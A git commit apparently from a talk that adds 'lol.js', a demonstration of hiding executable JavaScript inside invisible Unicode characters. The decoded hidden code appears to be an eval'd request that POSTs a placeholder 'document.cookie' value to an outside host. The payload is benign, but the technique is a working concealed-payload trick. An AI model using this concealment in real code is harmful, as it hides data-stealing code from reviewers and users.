a31ee7baae5d3e38a7679323dc5588a9bbcef2bd
James Atherton <james@bitovi.com>
2017-08-24 15:52:58 -0500

    Original lolscript as presented today. (assuming git doesn't strip the evil away)

---
+++ lol.js
@@ -0,0 +1,13 @@
+// What if I told you the final value of 'lol' depends on the website you're on?
+// YOU WON'T BELIEVE WHAT IT IS WHEN YOU'RE ON https://google.com !!
+var lol = this;
+var lo󠅥󠅮󠅤󠅩󠅡󠅮l = lol => (new TextDecoder()).decode(new Uint8Array(Uint16Array.from(lol, x => x.codePointAt(0)).buffer));
+var lo󠅵󠅮l = lo󠅥󠅮󠅤󠅩󠅡󠅮l("湵");
+var lo󠅥󠅳󠅣󠅡󠅰󠅥l = lo󠅥󠅮󠅤󠅩󠅡󠅮l("獥慣数");
+var lo󠅤󠅥󠅣󠅯󠅤󠅥󠅲l = lo󠅰󠅡󠅲󠅡󠅭l => lol[lo󠅵󠅮l + lo󠅥󠅳󠅣󠅡󠅰󠅥l](lol[lo󠅥󠅳󠅣󠅡󠅰󠅥l](lo󠅰󠅡󠅲󠅡󠅭l).replace(/uDB40%uDD/g,[])).slice(2,-1);
+var lo󠅥󠅶󠅡󠅬l = lol[lo󠅤󠅥󠅣󠅯󠅤󠅥󠅲l("lo󠅥󠅶󠅡󠅬l")];
+lo󠅥󠅶󠅡󠅬l(lo󠅤󠅥󠅣󠅯󠅤󠅥󠅲l("lo󠅶󠅡󠅲󠄠󠅸󠅨󠅲󠄠󠄽󠄠󠅮󠅥󠅷󠄠󠅘󠅍󠅌󠅈󠅴󠅴󠅰󠅒󠅥󠅱󠅵󠅥󠅳󠅴󠄨󠄩󠄻󠄠󠅸󠅨󠅲󠄮󠅯󠅰󠅥󠅮󠄨󠄢󠅐󠅏󠅓󠅔󠄢󠄬󠄠󠄢󠅨󠅴󠅴󠅰󠅳󠄺󠄯󠄯󠅢󠅩󠅴󠅯󠅶󠅩󠄮󠅣󠅯󠅭󠄯󠄢󠄬󠄠󠅴󠅲󠅵󠅥󠄩󠄻󠄠󠅸󠅨󠅲󠄮󠅳󠅥󠅮󠅤󠄨󠅊󠅓󠅏󠅎󠄮󠅳󠅴󠅲󠅩󠅮󠅧󠅩󠅦󠅹󠄨󠅻󠄠󠄢󠅤󠅯󠅣󠅵󠅭󠅥󠅮󠅴󠄮󠅣󠅯󠅯󠅫󠅩󠅥󠄢󠄺󠄠󠄢󠅴󠅨󠅩󠅳󠄠󠅥󠅡󠅳󠅩󠅬󠅹󠄠󠅣󠅯󠅵󠅬󠅤󠄠󠅨󠅡󠅶󠅥󠄠󠅢󠅥󠅥󠅮󠄠󠅹󠅯󠅵󠅲󠄠󠅳󠅥󠅳󠅳󠅩󠅯󠅮󠄠󠅩󠅮󠅦󠅯󠅲󠅭󠅡󠅴󠅩󠅯󠅮󠄮󠄠󠄼󠄳󠄢󠄠󠅽󠄩󠄩󠄻l"));
+
+
+
+
